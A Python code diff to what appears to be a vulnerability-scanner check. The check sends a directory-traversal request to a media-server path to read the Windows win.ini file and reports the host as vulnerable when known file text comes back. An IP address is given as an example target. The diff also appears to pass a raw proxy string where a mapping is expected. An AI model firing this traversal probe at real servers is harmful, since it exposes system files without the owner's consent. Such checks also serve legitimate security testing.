@@ -30,7 +30,7 @@ _info = {
     "example" : "34.95.215.4",
     "exp_img" : "",
 
-    "timeout" : 5,
+    "timeout" : 10,
 }
 
 def verify(host,proxy):
@@ -45,12 +45,6 @@ def verify(host,proxy):
     vuln = [False,""]
     url = url_handle(host) + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"
 
-    proxies = None
-    if proxy:
-        proxies = {
-        "http": "http://%s"%(proxy),
-        "https": "http://%s"%(proxy),
-        }
 
     headers = {"User-Agent":get_random_ua(),
                 "Connection":"close",
@@ -58,9 +52,9 @@ def verify(host,proxy):
                 }
 
     try:
-        req = requests.get(url,timeout = _info["timeout"],headers = headers,proxies=proxies,verify = False)
+        req = requests.get(url,timeout = _info["timeout"],headers = headers,proxies=proxy,verify = False)
        
-        if req.status_code == 200 and req.text is not None:
+        if req.status_code == 200 and "; for 16-bit app support" in req.text:
             vuln = [True,req.text]
         else:
             vuln = [False,req.text]
